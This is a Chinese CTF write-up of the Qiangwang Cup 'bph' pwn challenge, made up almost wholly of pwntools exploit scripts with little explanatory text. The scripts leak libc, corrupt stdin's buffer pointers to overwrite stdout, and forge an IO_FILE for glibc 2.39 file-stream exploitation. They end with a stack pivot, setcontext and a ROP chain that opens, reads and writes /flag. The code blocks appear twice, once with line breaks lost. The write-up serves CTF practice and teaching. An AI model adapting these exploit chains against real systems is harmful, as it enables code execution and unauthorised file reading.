# web选手入门pwn(31)——强网杯bph

> 原文: https://www.ctfiot.com/288976.html
> ID: 288976

sudo docker run -it --rm -v $PWD:/pwn roderickchan/debug_pwn_env:24.04-2.39-0ubuntu8.3-20240922 /bin/bash

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)
sh.interactive()

sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#stdout = "AAAA"sh.sendafter("Choice:", "AAAA")

web选手入门pwn(28)

system = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_base
file1 = IO_FILE_plus_struct()file1.flags = 0                           # stdout->_flags = 0    file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = system                      # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps - 0x20               # stdout->vtable->xsputn = _IO_wfile_overflow
#stdout = fake_stdoutsh.sendafter("Choice:", bytes(file1))

leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basefile1.chain = leave

file1._IO_read_ptr = stdout

file1.flags = stdout

jumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0file1.vtable = jumps_mmap - 0x20

file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)

#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basepivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe0file1._IO_read_end = stdout+0xe1file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#stdout = fake_stdoutfake_stdout = p64(0x0) * 9 + bytes(file1) + p64(system)sh.sendafter("Choice:", fake_stdout)
sh.interactive()

from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
#sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0setcontext = libc.sym['setcontext'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base
pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; retset_rdx = libc_base+ 0x1a1f6b       # mov dl, 0x65 ; ret
open = libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe8file1._IO_read_end = stdout+0xe9file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#orwrop_shellcode  = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode += p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode += p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)
#stdout = fake_stdoutfake_stdout = p64(0x0)*9 + bytes(file1) + b"/flagx00x00x00" + rop_shellcodesh.sendafter("Choice:", fake_stdout)
sh.interactive()

mov rsp,QWORD PTR [rdx+0xa0]

mov rsp, rdx; ret

file1._IO_read_ptr = stdout+0xe8-0xa0file1._IO_read_end = stdout+0xe9-0xa0file1.chain = setcontext+61fake_stdout = p64(0x0)*9#stdoutfake_stdout += bytes(file1) + b"/flagx00x00x00"#stdout + 0xe8fake_stdout += p64(stdout+0xf0)#stdout + 0xf0fake_stdout += p64(ret) +  rop_shellcode


```
sudo docker run -it --rm -v $PWD:/pwn roderickchan/debug_pwn_env:24.04-2.39-0ubuntu8.3-20240922 /bin/bash
```



```
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)
sh.interactive()
```



```
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout) + p64(stdout+0x200))#stdout = "AAAA"sh.sendafter("Choice:", "AAAA")
```



```
system = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_base
file1 = IO_FILE_plus_struct()file1.flags = 0                           # stdout->_flags = 0    file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = system                      # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps - 0x20               # stdout->vtable->xsputn = _IO_wfile_overflow
#stdout = fake_stdoutsh.sendafter("Choice:", bytes(file1))
```



```
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basefile1.chain = leave
```



```
file1._IO_read_ptr = stdout
```



```
file1.flags = stdout
```



```
jumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0file1.vtable = jumps_mmap - 0x20
```



```
file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)
```



```
#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
```



```
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")#sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basesystem = libc.sym['system'] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0
leave = rop.find_gadget(['leave', 'ret'])[0] + libc_basepivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; ret
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe0file1._IO_read_end = stdout+0xe1file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#stdout = fake_stdoutfake_stdout = p64(0x0) * 9 + bytes(file1) + p64(system)sh.sendafter("Choice:", fake_stdout)
sh.interactive()
```



```
from pwn import *from pwncli import *
context.log_level = 'debug'context.arch='amd64'context.terminal = ['tmux','splitw','-h']
#sh = gdb.debug("./chall" , "b *0x5555555558d2n b *0x55555555535an cnb *0x7ffff7de5f5f")sh = process("./chall")libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")rop = ROP(libc)
sh.sendafter("token:","A" * 0x28)libc_N = u64(sh.recvuntil("x7f")[-6:]+b"x00x00")libc_base = libc_N - 0xadd9eprint("libc_base: "+hex(libc_base))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_basestdin = libc.sym["_IO_2_1_stdin_"] + libc_basejumps = libc.sym['_IO_wfile_jumps'] + libc_basejumps_mmap = jumps + 0xb0setcontext = libc.sym['setcontext'] + libc_baselibc_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_baselibc_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base
pivot_gadget = libc_base + 0x5ef5f  # mov rsp, rdx; retset_rdx = libc_base+ 0x1a1f6b       # mov dl, 0x65 ; ret
open = libc.sym["open"] + libc_baseread = libc.sym["read"] + libc_basewrite = libc.sym["write"] + libc_base
sh.sendlineafter("Choice:","1")#stdin->_IO_buf_base write 0x00sh.sendlineafter("Size:",str(stdin+56+1))sh.sendlineafter("Content:", "")sh.recvuntil("bad choice")#stdin->_IO_buf_base = stdout-0x48  stdin->_IO_buf_end = stdout+0x200sh.sendafter("Choice:", p64(0x0) + p64(0x0) + p64(0x0) + p64(stdout-0x48) + p64(stdout+0x200))
file1 = IO_FILE_plus_struct()file1.flags = 0file1._IO_read_ptr = stdout+0xe8file1._IO_read_end = stdout+0xe9file1._lock = stdout + 0x300              # stdout->_lock can write and free addr file1.chain = pivot_gadget                # call _wide_vtable->__doallocatefile1._codecvt = stdout                   # _wide_data->_wide_vtable = p *(struct _IO_jump_t *) &_IO_2_1_stdout_file1._wide_data = stdout - 0x48          # stdout->_wide_data =  p *(struct _IO_wide_data *) (&_IO_2_1_stdout_ - 0x48)file1.vtable = jumps_mmap - 0x20          # stdout->vtable->xsputn = _io_wfile_underflow_mmap
#orwrop_shellcode  = p64(libc_pop_rdi) + p64(stdout+0xe0) + p64(libc_pop_rsi) + p64(0) + p64(open)rop_shellcode += p64(libc_pop_rdi) + p64(0x3) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(read)rop_shellcode += p64(libc_pop_rdi) + p64(0x1) + p64(libc_pop_rsi) + p64(stdout+0x200) + p64(set_rdx) + p64(write)
#stdout = fake_stdoutfake_stdout = p64(0x0)*9 + bytes(file1) + b"/flagx00x00x00" + rop_shellcodesh.sendafter("Choice:", fake_stdout)
sh.interactive()
```



```
mov rsp,QWORD PTR [rdx+0xa0]
```



```
mov rsp, rdx; ret
```



```
file1._IO_read_ptr = stdout+0xe8-0xa0file1._IO_read_end = stdout+0xe9-0xa0file1.chain = setcontext+61fake_stdout = p64(0x0)*9#stdoutfake_stdout += bytes(file1) + b"/flagx00x00x00"#stdout + 0xe8fake_stdout += p64(stdout+0xf0)#stdout + 0xf0fake_stdout += p64(ret) +  rop_shellcode
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718287-wxsync-2025-12-a189cae598839d7966bfb08cb1b2619e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718289-wxsync-2025-12-3cbfc72cc5b9e0c02f9b1cf1b7d2b0e3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718292-wxsync-2025-12-09c13c2af53393ebb2b9153c6d6c86ee.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718296-wxsync-2025-12-a3b3c519b5ef3577730d7fc2b115425b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718298-wxsync-2025-12-f1ea13e1bb0173af9d57a5efe68bd8b0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718300-wxsync-2025-12-beb9cdb0daa85db564c6edbaa893d9ee.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718303-wxsync-2025-12-3cd6bb37cf25d446732e9410d78afdd0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718304-wxsync-2025-12-4881d7d9f2c70a1d485bab3bbe12d873.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718307-wxsync-2025-12-788573f51f8cfa0e420bc7df47776c4f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1766718309-wxsync-2025-12-63abfe120cde758e661084753dd6cba3.png)